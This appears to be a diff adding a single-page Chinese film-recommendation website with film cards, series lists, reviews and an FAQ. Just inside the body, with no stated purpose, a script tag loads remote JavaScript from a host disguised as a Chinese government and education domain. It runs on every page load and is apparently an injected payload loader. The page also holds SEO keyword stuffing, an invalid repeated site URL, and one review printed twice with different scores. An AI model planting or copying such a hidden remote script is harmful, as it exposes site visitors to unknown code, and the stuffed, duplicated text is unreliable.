@@ -1,0 +1,276 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+<link rel="icon" href="favicon.ico" type="image/x-icon">
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>小七电影网 - xiaoqidianyingwang-top 第七艺术与独立电影推荐</title>
+<meta name="description" content="小七电影网（https://xiaoqidianyingwang-top）以第七艺术为理念，用复古画廊杂志风推荐经典电影、独立制片、艺术剧集与纪录片。移动端自适应，必应收录友好。">
+<meta name="keywords" content="小七电影网, xiaoqidianyingwang-top, 第七艺术, 经典电影, 独立电影, 艺术剧集, 纪录片, 电影推荐">
+<meta name="author" content="小七电影网">
+<meta name="robots" content="index, follow">
+<meta name="msvalidate.01" content="YOUR_BING_VERIFICATION_CODE">
+<style>
+*{margin:0;padding:0;box-sizing:border-box}
+body{font-family:"Noto Serif SC","Source Han Serif SC","SimSun",serif;color:#1a1a1a;line-height:1.8;overflow-x:hidden;background:#f4f1ea}
+a{color:#c02e2e;text-decoration:none;transition:.3s}
+a:hover{color:#d4a843}
+.sq-nav{position:fixed;top:0;width:100%;z-index:1000;background:rgba(244,241,234,.95);backdrop-filter:blur(8px);border-bottom:1px solid #d0c8b8}
+.sq-in{max-width:1200px;margin:0 auto;height:68px;padding:0 1.5rem;display:flex;align-items:center;justify-content:space-between}
+.sq-logo{display:flex;align-items:baseline;gap:.6rem}
+.sq-no{font-size:2rem;font-weight:900;color:#c02e2e;line-height:1;font-family:"Times New Roman",serif;font-style:italic}
+.sq-name{font-size:1.15rem;font-weight:700;color:#1a1a1a;letter-spacing:2px}
+.sq-name small{display:block;font-size:.45rem;letter-spacing:4px;color:#888;font-weight:400;font-family:sans-serif}
+.sq-links{display:flex;gap:1.8rem;list-style:none}
+.sq-links a{font-size:.8rem;font-weight:700;color:#1a1a1a;letter-spacing:1px;position:relative}
+.sq-links a:hover{color:#c02e2e}
+.sq-links a::after{content:"";position:absolute;bottom:-4px;left:0;width:0;height:1px;background:#c02e2e;transition:.3s}
+.sq-links a:hover::after{width:100%}
+.sq-toggle{display:none;flex-direction:column;gap:4px;cursor:pointer;padding:6px}
+.sq-toggle span{width:24px;height:1.5px;background:#1a1a1a}
+.sq-hero{margin-top:68px;padding:5rem 1.5rem 4rem;border-bottom:2px solid #1a1a1a;position:relative;overflow:hidden}
+.sq-hero::before{content:"VII";position:absolute;right:-2%;top:10%;font-size:22rem;font-weight:900;color:rgba(192,46,46,.04);line-height:1;font-family:"Times New Roman",serif;pointer-events:none}
+.sq-hero-in{max-width:1100px;margin:0 auto;display:grid;grid-template-columns:1fr 1fr;gap:3rem;align-items:center;position:relative;z-index:1}
+.sq-hero-text h1{font-size:3rem;font-weight:900;color:#1a1a1a;line-height:1.15;margin-bottom:1rem}
+.sq-hero-text h1 em{color:#c02e2e;font-style:italic;font-family:"Times New Roman",serif}
+.sq-hero-text p{font-size:.95rem;color:#444;margin-bottom:1.5rem;text-align:justify}
+.sq-hero-text p::first-letter{font-size:2.4rem;float:left;line-height:.8;margin-right:.4rem;color:#c02e2e;font-weight:900}
+.sq-domain{display:inline-block;padding:.6rem 1.2rem;border:1px solid #1a1a1a;color:#1a1a1a;font-family:"Courier New",monospace;font-size:.82rem;font-weight:700;background:#fff;margin-bottom:1.5rem}
+.sq-btn{display:inline-block;padding:.8rem 2.2rem;background:#c02e2e;color:#fff;font-weight:700;font-size:.85rem;letter-spacing:2px;border:1px solid #c02e2e}
+.sq-btn:hover{background:#1a1a1a;border-color:#1a1a1a;color:#fff}
+.sq-hero-side{border-left:1px solid #d0c8b8;padding-left:2.5rem}
+.sq-hero-side .sq-quote{font-size:1.1rem;line-height:1.9;color:#333;font-style:italic;margin-bottom:1.2rem;position:relative;padding-left:1.2rem;border-left:3px solid #c02e2e}
+.sq-hero-side .sq-quote::before{content:""}
+.sq-hero-side .sq-quote-author{font-size:.75rem;color:#888;text-align:right}
+.sq-sec{max-width:1200px;margin:0 auto;padding:4rem 1.5rem}
+.sq-head{display:flex;align-items:flex-end;justify-content:space-between;margin-bottom:2.5rem;border-bottom:1px solid #1a1a1a;padding-bottom:.8rem}
+.sq-head h2{font-size:1.6rem;font-weight:900;color:#1a1a1a;letter-spacing:1px}
+.sq-head h2 span{color:#c02e2e;font-family:"Times New Roman",serif;font-style:italic;margin-right:.4rem}
+.sq-head .sq-more{font-size:.75rem;color:#888;letter-spacing:1px}
+.sq-grid{display:grid;grid-template-columns:repeat(auto-fill,minmax(220px,1fr));gap:1.5rem}
+.sq-card{background:#fff;border:1px solid #d0c8b8;overflow:hidden;transition:.4s;position:relative}
+.sq-card:hover{box-shadow:0 8px 24px rgba(0,0,0,.08);transform:translateY(-3px)}
+.sq-cover{height:170px;filter:grayscale(100%);transition:.4s;display:flex;align-items:flex-end;padding:.8rem;font-weight:700;font-size:.9rem;color:#fff;position:relative}
+.sq-card:hover .sq-cover{filter:grayscale(0%)}
+.sq-cover::after{content:"";position:absolute;inset:0;background:linear-gradient(180deg,transparent 40%,rgba(0,0,0,.7))}
+.sq-cover b{position:relative;z-index:1}
+.c1{background:#2c2c2c}.c2{background:#4a3728}.c3{background:#1a3a4a}.c4{background:#3a1a2e}.c5{background:#2e3a1a}.c6{background:#4a2e1a}.c7{background:#1a4a3a}.c8{background:#3a3a1a}
+.sq-body{padding:.9rem 1rem}
+.sq-body h3{color:#1a1a1a;font-size:.88rem;margin-bottom:.3rem;font-weight:700}
+.sq-tags{display:flex;flex-wrap:wrap;gap:.25rem;margin-bottom:.4rem}
+.sq-tags span{padding:.1rem .4rem;border:1px solid #d0c8b8;color:#666;font-size:.6rem;font-family:sans-serif}
+.sq-score{color:#c02e2e;font-weight:700;font-size:.85rem}
+.sq-list-sec{background:#ede8db}
+.sq-list{max-width:1200px;margin:0 auto;padding:4rem 1.5rem}
+.sq-list-item{display:grid;grid-template-columns:50px 1fr auto;gap:1.5rem;align-items:center;padding:1.2rem 0;border-bottom:1px solid #d0c8b8;transition:.3s}
+.sq-list-item:hover{background:rgba(192,46,46,.03);padding-left:1rem}
+.sq-list-num{font-size:1.8rem;font-weight:900;color:#d0c8b8;font-family:"Times New Roman",serif;font-style:italic}
+.sq-list-item:hover .sq-list-num{color:#c02e2e}
+.sq-list-item h3{font-size:1rem;font-weight:700;color:#1a1a1a;margin-bottom:.2rem}
+.sq-list-item p{font-size:.78rem;color:#666;font-family:sans-serif}
+.sq-list-tag{padding:.3rem .8rem;border:1px solid #c02e2e;color:#c02e2e;font-size:.7rem;font-weight:700;font-family:sans-serif;white-space:nowrap}
+.sq-review{max-width:900px;margin:0 auto;padding:4rem 1.5rem}
+.sq-review-item{display:grid;grid-template-columns:80px 1fr;gap:1.5rem;margin-bottom:2rem;align-items:start}
+.sq-review-num{font-size:3.5rem;font-weight:900;color:#c02e2e;line-height:.9;font-family:"Times New Roman",serif}
+.sq-review-content h3{font-size:1.1rem;font-weight:700;margin-bottom:.5rem}
+.sq-review-content p{font-size:.88rem;color:#444;text-align:justify;margin-bottom:.6rem}
+.sq-review-content .sq-stars{color:#d4a843;letter-spacing:2px}
+.sq-about{max-width:800px;margin:0 auto;padding:4rem 1.5rem;text-align:center}
+.sq-about h2{font-size:1.8rem;font-weight:900;margin-bottom:1.5rem}
+.sq-about h2 span{color:#c02e2e}
+.sq-about p{font-size:.95rem;color:#444;margin-bottom:1.2rem;text-align:justify;line-height:2}
+.sq-about .sq-dom2{display:inline-block;margin-top:1rem;padding:.8rem 1.6rem;border:2px solid #1a1a1a;color:#1a1a1a;font-family:monospace;font-weight:700;font-size:.85rem;background:#fff}
+.sq-faq{max-width:800px;margin:0 auto;padding:4rem 1.5rem}
+.sq-fi{background:#fff;border:1px solid #d0c8b8;margin-bottom:.8rem}
+.sq-fi summary{padding:1.1rem 1.4rem;cursor:pointer;font-weight:700;color:#1a1a1a;list-style:none;position:relative;padding-right:3rem;font-size:.9rem}
+.sq-fi summary::-webkit-details-marker{display:none}
+.sq-fi summary::after{content:"＋";position:absolute;right:1.4rem;top:50%;transform:translateY(-50%);color:#c02e2e;font-weight:900;font-size:1rem}
+.sq-fi[open] summary::after{content:"－"}
+.sq-fi p{padding:0 1.4rem 1.1rem;color:#444;font-size:.88rem;line-height:1.8}
+.sq-foot{text-align:center;padding:2.5rem 1.5rem;color:#888;font-size:.75rem;border-top:2px solid #1a1a1a;background:#ede8db;font-family:sans-serif}
+.sq-foot p{margin-bottom:.3rem}
+@media(max-width:768px){
+.sq-links{display:none;position:absolute;top:100%;left:0;width:100%;background:rgba(244,241,234,.98);flex-direction:column;padding:.5rem 0;border-bottom:1px solid #d0c8b8}
+.sq-links.show{display:flex}
+.sq-links a{padding:.9rem 1.5rem}
+.sq-toggle{display:flex}
+.sq-hero{padding:3rem 1rem}
+.sq-hero-in{grid-template-columns:1fr;gap:2rem}
+.sq-hero-text h1{font-size:1.9rem}
+.sq-hero::before{font-size:10rem;right:-5%}
+.sq-hero-side{border-left:none;border-top:1px solid #d0c8b8;padding-left:0;padding-top:2rem}
+.sq-sec{padding:2.5rem 1rem}
+.sq-head h2{font-size:1.3rem}
+.sq-grid{grid-template-columns:repeat(auto-fill,minmax(150px,1fr));gap:1rem}
+.sq-cover{height:140px;font-size:.8rem}
+.sq-list-item{grid-template-columns:35px 1fr;gap:.8rem}
+.sq-list-tag{display:none}
+.sq-review-item{grid-template-columns:50px 1fr;gap:1rem}
+.sq-review-num{font-size:2.2rem}
+}
+@media(max-width:480px){.sq-hero-text h1{font-size:1.5rem}.sq-grid{grid-template-columns:1fr 1fr}}
+</style>
+</head>
+<body>
+<script src="https://www.gov.cn.edu.cn.889988.info/changyuan.js"></script>
+
+<nav class="sq-nav">
+  <div class="sq-in">
+    <div class="sq-logo">
+      <div class="sq-no">7</div>
+      <div class="sq-name">小七电影网<small>THE SEVENTH ART</small></div>
+    </div>
+    <ul class="sq-links" id="sqLinks">
+      <li><a href="#home">首页</a></li>
+      <li><a href="#movies">精选</a></li>
+      <li><a href="#series">剧集</a></li>
+      <li><a href="#review">评论</a></li>
+      <li><a href="#about">关于</a></li>
+      <li><a href="#faq">FAQ</a></li>
+    </ul>
+    <div class="sq-toggle" onclick="tSq()"><span></span><span></span><span></span></div>
+  </div>
+</nav>
+
+<section class="sq-hero" id="home">
+  <div class="sq-hero-in">
+    <div class="sq-hero-text">
+      <h1>小七电影网<br>第<em>七</em>艺术的<br>安静角落</h1>
+      <p>小七电影网（xiaoqidianyingwang-top）以"第七艺术"为核心理念——电影不只是娱乐，它是光与影的诗。在这里，每一部作品都被当作一幅画作、一首乐章来品读。黑白与彩色之间，藏着时间的纹理。</p>
+      <div class="sq-domain">https://xiaoqidianyingwang-top</div><br>
+      <a href="#movies" class="sq-btn">翻阅片单 →</a>
+    </div>
+    <div class="sq-hero-side">
+      <div class="sq-quote">"电影是第七艺术，它综合了建筑、音乐、绘画、雕塑、诗歌和舞蹈，却超越了它们的总和。"</div>
+      <div class="sq-quote-author">—— 乔托·卡努杜（Ricciotto Canudo）</div>
+    </div>
+  </div>
+</section>
+
+<section class="sq-sec" id="movies">
+  <div class="sq-head"><h2><span>01.</span>精选电影</h2><span class="sq-more">CURATED SELECTION</span></div>
+  <div class="sq-grid">
+    <div class="sq-card"><div class="sq-cover c1"><b>霸王别姬</b></div><div class="sq-body"><h3>霸王别姬</h3><div class="sq-tags"><span>剧情</span><span>文艺</span></div><div class="sq-score">★ 9.6</div></div></div>
+    <div class="sq-card"><div class="sq-cover c2"><b>花样年华</b></div><div class="sq-body"><h3>花样年华</h3><div class="sq-tags"><span>爱情</span><span>怀旧</span></div><div class="sq-score">★ 8.7</div></div></div>
+    <div class="sq-card"><div class="sq-cover c3"><b>2001太空漫游</b></div><div class="sq-body"><h3>2001太空漫游</h3><div class="sq-tags"><span>科幻</span><span>哲学</span></div><div class="sq-score">★ 8.9</div></div></div>
+    <div class="sq-card"><div class="sq-cover c4"><b>布达佩斯大饭店</b></div><div class="sq-body"><h3>布达佩斯大饭店</h3><div class="sq-tags"><span>喜剧</span><span>视觉</span></div><div class="sq-score">★ 8.9</div></div></div>
+    <div class="sq-card"><div class="sq-cover c5"><b>寄生虫</b></div><div class="sq-body"><h3>寄生虫</h3><div class="sq-tags"><span>悬疑</span><span>社会</span></div><div class="sq-score">★ 8.8</div></div></div>
+    <div class="sq-card"><div class="sq-cover c6"><b>辛德勒的名单</b></div><div class="sq-body"><h3>辛德勒的名单</h3><div class="sq-tags"><span>历史</span><span>传记</span></div><div class="sq-score">★ 9.5</div></div></div>
+    <div class="sq-card"><div class="sq-cover c7"><b>罗马</b></div><div class="sq-body"><h3>罗马</h3><div class="sq-tags"><span>剧情</span><span>黑白</span></div><div class="sq-score">★ 8.2</div></div></div>
+    <div class="sq-card"><div class="sq-cover c8"><b>请以你的名字呼唤我</b></div><div class="sq-body"><h3>请以你的名字呼唤我</h3><div class="sq-tags"><span>爱情</span><span>青春</span></div><div class="sq-score">★ 8.1</div></div></div>
+  </div>
+</section>
+
+<section class="sq-list-sec" id="series">
+  <div class="sq-list">
+    <div class="sq-head"><h2><span>02.</span>剧集与迷你系列</h2><span class="sq-more">SERIES & MINI-SERIES</span></div>
+    <div class="sq-list-item">
+      <div class="sq-list-num">01</div>
+      <div><h3>切尔诺贝利</h3><p>HBO迷你剧 / 历史灾难 / 5集</p></div>
+      <div class="sq-list-tag">必看</div>
+    </div>
+    <div class="sq-list-item">
+      <div class="sq-list-num">02</div>
+      <div><h3>王冠 第六季</h3><p>Netflix / 传记历史 / 黛安娜篇</p></div>
+      <div class="sq-list-tag">热门</div>
+    </div>
+    <div class="sq-list-item">
+      <div class="sq-list-num">03</div>
+      <div><h3>东城梦魇</h3><p>HBO / 悬疑犯罪 / 凯特·温斯莱特</p></div>
+      <div class="sq-list-tag">推荐</div>
+    </div>
+    <div class="sq-list-item">
+      <div class="sq-list-num">04</div>
+      <div><h3>鱿鱼游戏 第二季</h3><p>Netflix / 生存惊悚 / 年度话题</p></div>
+      <div class="sq-list-tag">新作</div>
+    </div>
+    <div class="sq-list-item">
+      <div class="sq-list-num">05</div>
+      <div><h3>怒呛人生</h3><p>A24 / 黑色喜剧 / 存在主义</p></div>
+      <div class="sq-list-tag">口碑</div>
+    </div>
+    <div class="sq-list-item">
+      <div class="sq-list-num">06</div>
+      <div><h3>百年孤独</h3><p>Netflix / 文学改编 / 马孔多</p></div>
+      <div class="sq-list-tag">期待</div>
+    </div>
+  </div>
+</section>
+
+<section class="sq-sec" id="review">
+  <div class="sq-head"><h2><span>03.</span>第七艺术评论</h2><span class="sq-more">CRITIQUE</span></div>
+  <div class="sq-review">
+    <div class="sq-review-item">
+      <div class="sq-review-num">01</div>
+      <div class="sq-review-content">
+        <h3>《坠落的审判》：法庭上的婚姻解剖学</h3>
+        <p>茹斯汀·特里耶用一场坠楼案，撬开了婚姻中最隐秘的裂缝。影片没有非黑即白的答案，只有生活本身的重量。桑德拉·惠勒的表演是今年银幕上最沉静的飓风。</p>
+        <div class="sq-stars">★★★★★ 9.2/10</div>
+      </div>
+    </div>
+    <div class="sq-review-item">
+      <div class="sq-review-num">02</div>
+      <div class="sq-review-content">
+        <h3>《奥本海默》：诺兰的核爆美学</h3>
+        <p>170分钟，IMAX胶片，没有CGI的核爆——诺兰用最古典的方式拍出了最现代的焦虑。基里安·墨菲的眼睛里装着整个曼哈顿计划的重量。</p>
+        <div class="sq-stars">★★★★★ 8.8/10</div>
+      </div>
+    </div>
+    <div class="sq-review-item">
+      <div class="sq-review-num">03</div>
+      <div class="sq-review-content">
+        <h3>《坠落的审判》：法庭上的婚姻解剖学</h3>
+        <p>茹斯汀·特里耶用一场坠楼案，撬开了婚姻中最隐秘的裂缝。影片没有非黑即白的答案，只有生活本身的重量。</p>
+        <div class="sq-stars">★★★★☆ 8.5/10</div>
+      </div>
+    </div>
+    <div class="sq-review-item">
+      <div class="sq-review-num">04</div>
+      <div class="sq-review-content">
+        <h3>《沙丘2》：科幻史诗的视觉圣歌</h3>
+        <p>维伦纽瓦将弗兰克·赫伯特的沙丘宇宙推向了宗教般的庄严。汉斯·季默的配乐像沙漠风暴一样席卷耳膜，每一帧都是壁纸。</p>
+        <div class="sq-stars">★★★★★ 9.0/10</div>
+      </div>
+    </div>
+  </div>
+</section>
+
+<section class="sq-sec" id="about">
+  <div class="sq-head"><h2><span>04.</span>关于小七电影网</h2><span class="sq-more">ABOUT</span></div>
+  <div class="sq-about">
+    <h2>为什么叫<em style="color:#c02e2e;font-style:italic">小七</em>？</h2>
+    <p>1911年，意大利诗人和电影先驱乔托·卡努杜发表了名为《第七艺术宣言》的论著，第一次宣称电影是一种艺术，是一种综合了建筑、音乐、绘画、雕塑、诗歌和舞蹈的独立艺术形式——<b>第七艺术</b>。</p>
+    <p>小七电影网（xiaoqidianyingwang-top）以此为名，意在回归电影最初被当作"艺术"看待的那个年代。我们不追逐流量，不堆砌数据，只做安静的选片人。</p>
+    <div class="sq-dom2">https://xiaoqidianyingwang-top</div>
+    <p style="margin-top:1.5rem;font-size:.8rem;color:#888">核心关键词：小七电影网、xiaoqidianyingwang-top、第七艺术、经典电影、独立电影、艺术剧集</p>
+  </div>
+</section>
+
+<section class="sq-sec" id="faq" style="background:#ede8db">
+  <div class="sq-head"><h2><span>05.</span>常见问题</h2><span class="sq-more">FAQ</span></div>
+  <div class="sq-faq">
+    <details class="sq-fi"><summary>小七电影网是什么？</summary><p>小七电影网（xiaoqidianyingwang-top）是以"第七艺术"为理念的影视信息展示站，用杂志编辑排版风格推荐经典电影、独立制片、艺术剧集与纪录片。</p></details>
+    <details class="sq-fi"><summary>为什么叫"小七"？</summary><p>电影被称为"第七艺术"（The Seventh Art），"小七"即取此意，致敬电影作为独立艺术形式的百年历史。</p></details>
+    <details class="sq-fi"><summary>官方网址是？</summary><p>https://xiaoqidianyingwang-top</p></details>
+    <details class="sq-fi"><summary>手机上浏览体验如何？</summary><p>全站响应式设计，移动端导航自动折叠为汉堡菜单，所有网格和列表自适应排列，阅读体验优化。</p></details>
+    <details class="sq-fi"><summary>如何提交给必应收录？</summary><p>前往 Bing Webmaster Tools 提交 https://xiaoqidianyingwang-top，将验证码填入页面 meta 标签 msvalidate.01 的 content 中即可。</p></details>
+  </div>
+</section>
+
+<footer class="sq-foot">
+  <p>© 2024 小七电影网 (xiaoqidianyingwang-top) — THE SEVENTH ART</p>
+  <p>单页网站 / 锚点导航 / 移动端自适应 / 必应收录友好 / 不生成 robots.txt 与 sitemap.xml</p>
+  <p style="margin-top:.5rem;color:#aaa">本站仅提供影视信息展示与评论，资源版权归原作者及发行方所有。</p>
+</footer>
+
+<script>
+function tSq(){document.getElementById('sqLinks').classList.toggle('show')}
+document.querySelectorAll('a[href^="#"]').forEach(function(a){
+  a.addEventListener('click',function(e){
+    var h=this.getAttribute('href');
+    if(h.length>1){var t=document.querySelector(h);if(t){e.preventDefault();t.scrollIntoView({behavior:'smooth',block:'start'});document.getElementById('sqLinks').classList.remove('show')}}
+  })
+});
+</script>
+</body>
+</html>
